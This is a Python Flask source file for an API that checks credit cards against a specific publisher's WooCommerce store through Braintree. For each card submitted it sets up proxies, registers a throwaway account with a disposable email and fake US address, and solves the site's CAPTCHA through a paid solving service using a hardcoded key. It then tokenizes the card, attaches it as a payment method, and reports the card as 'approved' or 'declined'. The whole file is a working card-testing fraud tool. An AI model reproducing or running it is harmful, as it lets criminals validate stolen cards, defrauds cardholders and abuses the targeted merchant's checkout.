from flask import Flask, request, jsonify
import requests
import time
import re
import json
import base64
import random
import string
import uuid
from datetime import datetime
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import os

app = Flask(__name__)

class StaticData:
    @staticmethod
    def get_us_addresses():
        return {
            'addresses': [
                {'line1': '123 Main Street', 'line2': '', 'city': 'New York', 'postcode': '10001', 'state': 'NY'},
                {'line1': '456 Oak Avenue', 'line2': '', 'city': 'Los Angeles', 'postcode': '90001', 'state': 'CA'},
                {'line1': '789 Pine Road', 'line2': '', 'city': 'Chicago', 'postcode': '60601', 'state': 'IL'},
                {'line1': '321 Elm Street', 'line2': '', 'city': 'Houston', 'postcode': '77001', 'state': 'TX'},
                {'line1': '654 Maple Drive', 'line2': '', 'city': 'Phoenix', 'postcode': '85001', 'state': 'AZ'},
                {'line1': '987 Cedar Lane', 'line2': '', 'city': 'Philadelphia', 'postcode': '19101', 'state': 'PA'},
                {'line1': '147 Birch Street', 'line2': '', 'city': 'San Antonio', 'postcode': '78201', 'state': 'TX'},
                {'line1': '258 Walnut Court', 'line2': '', 'city': 'San Diego', 'postcode': '92101', 'state': 'CA'},
                {'line1': '369 Spruce Way', 'line2': '', 'city': 'Dallas', 'postcode': '75201', 'state': 'TX'},
                {'line1': '741 Ash Avenue', 'line2': '', 'city': 'San Jose', 'postcode': '95101', 'state': 'CA'}
            ]
        }

def get_current_time():
    return datetime.now().strftime('%Y-%m-%d+%H%%3A%M%%3A%S')

def generate_braintree_session_id():
    return str(uuid.uuid4())

def generate_device_correlation_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def get_fake_chrome_ua():
    return UserAgent().chrome

def parse_proxy(proxy_string):
    if not proxy_string:
        return None
    parts = proxy_string.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return {
            'http': f'http://{user}:{password}@{host}:{port}',
            'https': f'http://{user}:{password}@{host}:{port}'
        }
    return None

def get_random_domain():
    vowels = 'aeiou'
    consonants = 'bcdfghjklmnpqrstvwxyz'
    keyword = random.choice(consonants) + random.choice(vowels)
    
    retry_count = 0
    MAX_RETRIES = 5
    while retry_count < MAX_RETRIES:
        try:
            response = requests.get(
                f'https://generator.email/search.php?key={keyword}',
                headers={'User-Agent': get_fake_chrome_ua()},
                timeout=30
            )
            domains = response.json()
            valid_domains = [d for d in domains if all(ord(c) < 128 for c in d)]
            
            if valid_domains:
                selected_domain = random.choice(valid_domains)
                return selected_domain
            
        except Exception:
            retry_count += 1
            time.sleep(2)
    return None

def generate_email_from_api():
    domain = get_random_domain()
    if not domain:
        fallback_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        domain = random.choice(fallback_domains)
    
    first_names = ['john', 'james', 'robert', 'michael', 'william', 'david', 'richard', 'joseph', 'thomas', 'charles']
    last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez']
    
    username = random.choice(first_names) + random.choice(last_names) + ''.join(random.choices(string.digits, k=4))
    email = f"{username}@{domain}"
    return email.lower()

def get_verification_link(email, domain):
    cookies = {
        'embx': f'[%22{email}%22]',
        'surl': f'{domain}/{email.split("@")[0]}'
    }
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'chrome-extension://fpdkjdnhkakefebpekbdhillbhonfjjp',
        'user-agent': get_fake_chrome_ua()
    }
    
    max_attempts = 20
    retry_count = 0
    
    while retry_count < max_attempts:
        try:
            response = requests.get(
                'https://generator.email/inbox1/',
                headers=headers,
                cookies=cookies,
                timeout=30
            )
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            link_pattern = re.compile(r'https://www\.windhorsepublications\.com/my-account/lost-password/\?action=newaccount&amp;key=[^&\s]+&amp;login=[^&\s"\']+')
            
            match = link_pattern.search(response.text)
            if match:
                raw_link = match.group(0)
                clean_link = raw_link.replace('&amp;', '&')
                return clean_link
            
            for a in soup.find_all('a', href=True):
                if 'lost-password' in a['href'] and 'action=newaccount' in a['href']:
                    link = a['href']
                    return link
            
            retry_count += 1
            time.sleep(8)
            
        except Exception:
            retry_count += 1
            time.sleep(8)
    
    return None

def extract_reset_key_and_login(link):
    key_match = re.search(r'key=([^&]+)', link)
    login_match = re.search(r'login=([^&"\']+)', link)
    
    if key_match and login_match:
        return key_match.group(1), login_match.group(1)
    return None, None

def extract_reset_nonce(soup):
    nonce_input = soup.find('input', {'id': 'woocommerce-reset-password-nonce'})
    if nonce_input:
        return nonce_input.get('value')
    return None

def solve_captcha(proxy_dict):
    url = "https://2captcha.com/in.php"
    payload = {
        'method': 'turnstile',
        'sitekey': '0x4AAAAAABlOW6yNK7nkNZ9x',
        'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'pageurl': 'https://www.windhorsepublications.com/my-account/',
        'soft_id': '2834',
        'key': '73d119f17772b90c47c640f43ae1a6d1',
        'header_acao': '1',
        'json': '1'
    }
    
    headers_captcha = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
    }
    
    response = requests.post(url, data=payload, headers=headers_captcha, proxies=proxy_dict)
    result = response.json()
    
    if result.get("status") != 1:
        return None
    
    captcha_id = result["request"]
    
    poll_url = "https://2captcha.com/res.php"
    max_attempts = 25
    wait_seconds = 8
    
    for attempt in range(max_attempts):
        params = {
            'action': "get",
            'id': captcha_id,
            'key': "73d119f17772b90c47c640f43ae1a6d1",
            'header_acao': "1",
            'json': "1"
        }
        
        response = requests.get(poll_url, params=params, headers=headers_captcha, proxies=proxy_dict)
        poll_result = response.json()
        
        if poll_result.get("status") == 1:
            token = poll_result.get("request")
            return token
        elif poll_result.get("request") == "CAPCHA_NOT_READY":
            time.sleep(wait_seconds)
        else:
            break
    
    return None

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'GET with cc and proxy parameters',
            '/health': 'GET - Check API health',
            'example': '/check?cc=4111111111111111|12|26|123&proxy=p.webshare.io:80:user:pass'
        },
        'gateway': 'Windhorse Publications - Braintree',
        'version': '1.0.0'
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time()
    })

@app.route('/check', methods=['GET'])
def check_card():
    session = requests.Session()
    
    try:
        cc_details = request.args.get('cc')
        proxy_string = request.args.get('proxy')
        
        if not cc_details:
            return jsonify({
                'status': 'error',
                'message': 'CC parameter is required. Use: ?cc=cardnumber|mm|yy|cvv',
                'example': '/check?cc=4111111111111111|12|26|123'
            }), 400
        
        cc_parts = cc_details.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid format. Use: cc|mm|yy|cvv',
                'example': '4111111111111111|12|26|123'
            }), 400
        
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip()
        yy = cc_parts[2].strip()
        cvv = cc_parts[3].strip()
        
        if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card number. Must be 15-16 digits'
            }), 400
        
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return jsonify({
                'status': 'error',
                'message': 'Invalid month. Must be 01-12'
            }), 400
        
        if not yy.isdigit() or len(yy) != 2:
            return jsonify({
                'status': 'error',
                'message': 'Invalid year. Must be 2 digits (e.g., 26 for 2026)'
            }), 400
        
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid CVV. Must be 3-4 digits'
            }), 400
        
        proxy_dict = parse_proxy(proxy_string) if proxy_string else None
        
        email = generate_email_from_api()
        domain = email.split('@')[1]
        us_address = random.choice(StaticData.get_us_addresses()['addresses'])
        
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        username = random.choice(first_names).lower() + ''.join(random.choices(string.digits, k=4))
        
        current_time = get_current_time()
        braintree_session_id = generate_braintree_session_id()
        device_correlation_id = generate_device_correlation_id()
        
        token = solve_captcha(proxy_dict)
        if not token:
            return jsonify({
                'status': 'error',
                'message': 'Failed to solve CAPTCHA'
            }), 200
        
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
        }
        
        response = session.get('https://www.windhorsepublications.com/my-account/', headers=headers1, proxies=proxy_dict, timeout=30)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        register_nonce = None
        register_nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
        if register_nonce_input:
            register_nonce = register_nonce_input.get('value')
        else:
            return jsonify({'status': 'error', 'message': 'Failed to get register nonce'}), 200
        
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cache-Control': 'max-age=0',
            'Origin': 'https://www.windhorsepublications.com',
            'Referer': 'https://www.windhorsepublications.com/my-account/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        ua = UserAgent()
        user_agent = ua.random
        
        data = f'email={email}&cf-turnstile-response={token}&mailchimp_woocommerce_gdpr[621a3e895f]=0&mailchimp_woocommerce_gdpr[621a3e895f]=1&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2F&wc_order_attribution_session_start_time={current_time}&wc_order_attribution_session_pages=19&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user_agent}&woocommerce-register-nonce={register_nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register'
        
        response = session.post('https://www.windhorsepublications.com/my-account/', headers=headers2, data=data, proxies=proxy_dict, timeout=30)
        
        verification_link = get_verification_link(email, domain)
        
        if not verification_link:
            return jsonify({'status': 'error', 'message': 'Failed to get verification link'}), 200
        
        reset_key, reset_login = extract_reset_key_and_login(verification_link)
        
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        params = {
            'action': 'newaccount',
            'key': reset_key,
            'login': reset_login,
        }
        
        response = session.get('https://www.windhorsepublications.com/my-account/lost-password/', params=params, headers=headers3, proxies=proxy_dict, timeout=30)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        reset_nonce = extract_reset_nonce(soup)
        
        if not reset_nonce:
            return jsonify({'status': 'error', 'message': 'Failed to get reset nonce'}), 200
        
        password = "DDcc55@&#"
        
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cache-Control': 'max-age=0',
            'Origin': 'https://www.windhorsepublications.com',
            'Referer': f'https://www.windhorsepublications.com/my-account/lost-password/?show-reset-form=true&action=newaccount&key={reset_key}&login={reset_login}',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        params2 = {
            'show-reset-form': 'true',
            'action': 'newaccount',
        }
        
        data2 = {
            'password_1': password,
            'password_2': password,
            'reset_key': reset_key,
            'reset_login': reset_login,
            'wc_reset_password': 'true',
            'woocommerce-reset-password-nonce': reset_nonce,
            '_wp_http_referer': '/my-account/lost-password/?show-reset-form=true&action=newaccount',
        }
        
        response = session.post('https://www.windhorsepublications.com/my-account/lost-password/', params=params2, headers=headers4, data=data2, proxies=proxy_dict, timeout=30)
        
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        response = session.get('https://www.windhorsepublications.com/my-account/edit-address/billing', headers=headers5, proxies=proxy_dict, timeout=30)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        address_nonce = None
        address_nonce_input = soup.find('input', {'id': 'woocommerce-edit-address-nonce'})
        if address_nonce_input:
            address_nonce = address_nonce_input.get('value')
        else:
            return jsonify({'status': 'error', 'message': 'Failed to get address nonce'}), 200
        
        headers6 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cache-Control': 'max-age=0',
            'Origin': 'https://www.windhorsepublications.com',
            'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        data3 = {
            'billing_email': email,
            'billing_first_name': us_address['city'],
            'billing_last_name': username,
            'billing_company': 'None',
            'billing_country': 'US',
            'billing_address_1': us_address['line1'],
            'billing_address_2': us_address['line2'],
            'billing_city': us_address['city'],
            'billing_state': us_address['state'],
            'billing_postcode': us_address['postcode'],
            'billing_phone': '2125551234',
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address'
        }
        
        response = session.post('https://www.windhorsepublications.com/my-account/edit-address/billing/', headers=headers6, data=data3, proxies=proxy_dict, timeout=30)
        
        headers7 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.windhorsepublications.com/my-account/payment-methods/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        response = session.get('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers7, proxies=proxy_dict, timeout=30)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        payment_nonce = None
        payment_nonce_input = soup.find('input', {'id': 'woocommerce-add-payment-method-nonce'})
        if payment_nonce_input:
            payment_nonce = payment_nonce_input.get('value')
        else:
            return jsonify({'status': 'error', 'message': 'Failed to get payment nonce'}), 200
        
        script_content = None
        for script in soup.find_all('script'):
            if script.string and 'wc_braintree_credit_card_payment_form_handler' in script.string:
                script_content = script.string
                break
        
        client_nonce = None
        if script_content:
            match = re.search(r'"client_token_nonce":"([^"]+)"', script_content)
            if match:
                client_nonce = match.group(1)
        
        if not client_nonce:
            return jsonify({'status': 'error', 'message': 'Failed to get client nonce'}), 200
        
        headers8 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.windhorsepublications.com',
            'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        payload = {'action': "wc_braintree_credit_card_get_client_token", 'nonce': client_nonce}
        
        response = session.post('https://www.windhorsepublications.com/wp-admin/admin-ajax.php', data=payload, headers=headers8, proxies=proxy_dict, timeout=30)
        result = response.json()
        
        if not result.get('success'):
            return jsonify({'status': 'error', 'message': 'Failed to get client token'}), 200
        
        token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
        auth = token_data.get('authorizationFingerprint')
        
        headers9 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        
        graphql_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = requests.post('https://payments.braintree-api.com/graphql', json=graphql_payload, headers=headers9, timeout=30)
        result = response.json()
        
        if 'errors' in result:
            return jsonify({'status': 'error', 'message': f'Tokenization error: {result.get("errors")}'}), 200
        
        card_token = result['data']['tokenizeCreditCard']['token']
        
        headers10 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cache-Control': 'max-age=0',
            'Origin': 'https://www.windhorsepublications.com',
            'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
        }
        
        payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled&wc-braintree-credit-card-3d-secure-verified&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22{device_correlation_id}%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
        
        response = session.post('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers10, data=payment_data, proxies=proxy_dict, timeout=30)
        html = response.text
        
        if 'Nice!' in html or 'Avs' in html or 'avs' in html or 'successfully' in html.lower():
            return jsonify({
                'status': 'approved',
                'message': 'Auth Successfully',
                'card': cc,
                'bin': cc[:6],
                'last4': cc[-4:],
                'email': email,
                'username': username
            }), 200
        else:
            error_message = 'Card declined'
            soup = BeautifulSoup(html, 'html.parser')
            error_div = soup.find('div', class_='woocommerce-notices-wrapper')
            if error_div:
                error_msgs = error_div.find_all('li')
                if error_msgs:
                    error_message = error_msgs[0].get_text(strip=True)
            return jsonify({
                'status': 'declined',
                'message': error_message,
                'card': cc
            }), 200
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500
    finally:
        session.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
